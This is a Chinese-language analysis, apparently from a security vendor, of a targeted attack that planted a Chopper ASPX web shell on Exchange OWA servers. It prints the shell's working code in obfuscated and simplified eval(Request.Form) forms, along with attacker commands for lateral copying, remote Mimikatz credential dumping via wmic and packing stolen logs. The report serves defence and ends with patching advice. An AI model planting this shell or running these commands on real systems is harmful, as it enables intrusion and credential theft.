### **概述**

Web shell通常简单直接，对系统和环境具有较强的破坏性。这些恶意代码片段可以用ASP、PHP和JSP编写，也可以使用通过网络传递参数的、可以执行系统命令的任何脚本编写。Web shell可以被嵌入到Web服务器上，攻击者可以使用它们来执行任意代码。Web shell程序仅用15个字节就可以实现远程管理目标计算机或系统。即使使用多层安全防护，也很难检测出这样的威胁，尤其是在它们没有被整合的情况下。

在本文中，我们将剖析一次利用Chopper ASPX web shell（趋势科技检测为Backdoor.ASP.WEBSHELL.UWMANA）进行的针对性攻击。

### **技术分析**

**初始访问**

根据我们的调查，Chopper web shell是通过系统token掉落的，可能是利用了Microsoft Exchange Server漏洞。Microsoft Exchange Server中有一个值得注意的远程代码执行漏洞CVE-2020-0688，微软在2020年2月发布了针对该漏洞的修复程序。但是，攻击者将Chopper web shell放在web目录文件夹中来建立持久性。通过ASPX文件，攻击者可以在受影响的面向公众的outlook web app（OWA）服务器中建立立足点，并通过它们发送远程命令。

Outlook Web App (Web Directory)  - D:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\15.1.2044\\scripts\\premium\\premium.aspx

 

以下脚本显示了攻击的特点：

<%@ PageLanguage="Jscript" Debug=true%>

 

<%

 

var a=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5Gb3JtWyJjb21tYW5kIl0="));

 

varb=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dW5zYWZl"));

 

var c=eval(a,b);

 

eval(c,b);

 

%>

 

简化后，恶意脚本如下。其中，eval用于执行，Request.Form获取要执行的参数。

<%@ PageLanguage="Jscript"%><%eval(Request.Form\["Command"\],"unsafe");%>

**用户活动检查**

一旦Chopper成功入侵系统，攻击者就会发出查询用户（quser）命令，试图识别系统中的主要用户或当前登录的用户。根据我们的观察，整个攻击过程中通常使用quser命令来确定活动的远程会话。 

  

 

 

**混淆技术**

为了部署其工具，它使用expand命令提取系统中掉落的软件包文件。

expand {filename}.ex\_ {filename}.dat

expand {filename}.ex\_ {filename}.exe

 

与其他Chopper攻击相比，我们发现这次攻击有一个明显的区别——它使用了.dat文件扩展名，该文件扩展名通常用于数据存储，例如用户配置文件ntuser.dat。在这个针对性的Chopper攻击中，.dat文件被用作可执行文件。

 

 

**横向移动**

之后，它将Chopper Web Shell复制到其它主机中的可访问共享文件夹中以获得访问权限。

copy premium.aspx"\\\\{hostname}\\d$\\Program Files\\Microsoft\\ExchangeServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\15.1.2044\\scripts\\premium

 

它还通过使用Hacktool.Win32.CATLIKE.A工具及合法的CURL，C:\\temp\\curl.dat来扫描整个网络中的漏洞。

它专门扫描Apache Tomcat、Citrix和phpMyAdmin应用程序中与Web服务器相关的漏洞和弱密码。以下是用于扫描某些应用程序和端口上与 Web 服务器相关的漏洞和密码的命令：

**通过session id执行任意命令**

成功利用CVE-2020-0688后，Chopper可以获得系统访问权限。在目标系统中，它会执行并删除Trojan.Win32.PRIVESC.A，该木马需要在拥有SeTcbPrivilege的用户下运行。它能够使攻击者看到所有的Windows会话，并可以通过session id对该session执行任意命令：

**发现**

为了发现目标，它使用了典型的Windows命令行工具，如nltest、ping、whoami、netstat、net、nslookup、hostname和tasklist，这些工具在其它攻击中经常被使用。此外，攻击者还安装并使用了一个在其他攻击者和域管理员中非常流行且公开JoeWare域工具LG.exe。

 

**访问凭证**

为了获取用户凭证，攻击者使用HackTool.MSIL.Mimikatz.AF，这是一个开源应用程序Mimikatz的修改版本，使用的参数如下：x，xxx，xxxx，xxxasd。

wmic /node:{ip address} process callcreate "cmd.exe /c c:\\users\\mpBD6D42.dat xxxasd -pass > c:\\users\\23.txt

 

**采集**

攻击者使用 wevtutil.exe 从目标用户名中查询与安全相关的事件，并将其导出为q.txt文件。为了打包被盗的凭据和其它日志，它使用makecab命令而不是第三方应用程序（例如rar.exe）。

makecab a.txt > 111

makecab aaa2.txt >1

 

攻击者使用已安装的安全组件或应用程序作为文件名来隐藏。

C:\\Program Files\\Trend Micro\\ams p.dat

C:\\Oracle\\Oracle.dat

C:\\Program Files\\McAfee\\MacAfee.dat

 

这些可疑活动是通过趋势科技XDR解决方案发现的，该解决方案可以帮助监视可观察到的攻击技术，并提供重要的安全警报，包括检测异常文件扩展名执行、通过系统工具的远程执行、与Web Shell相关的活动以及潜在的利用攻击。

 

 

### **安全建议**

Web Shell可以通过系统缺陷或问题（如漏洞）上传到目标系统中，攻击者将通过识别系统中易受攻击的应用程序来加以利用，通过安装Web Shell来远程执行代码或渗透。

以下是我们提供一些安全建议，以确保企业和组织能够抵御Web shell攻击。

*   为系统和应用程序打补丁。确保对面向公众的应用程序都安装了最新的漏洞补丁，如Apache Tomcat、Oracle Web Logic Server、Microsoft Exchange Server和PHPMyAdmin。
    
*   实施强密码。不要对多个应用程序或网站使用相同的密码。尽可能使用多因素认证，并定期更新。
    
*   检查IIS web.config文件中的静态密钥。正如在CVE-2020-0688上观察到的那样，使用静态密钥（非随机生成密钥）--可以允许攻击者通过欺骗服务器反序列化ViewState数据来执行任意代码。
    

 

企业和组织应预防并实时进行全面、高效的检测，以保护关键数据和业务免受复杂的攻击和威胁。
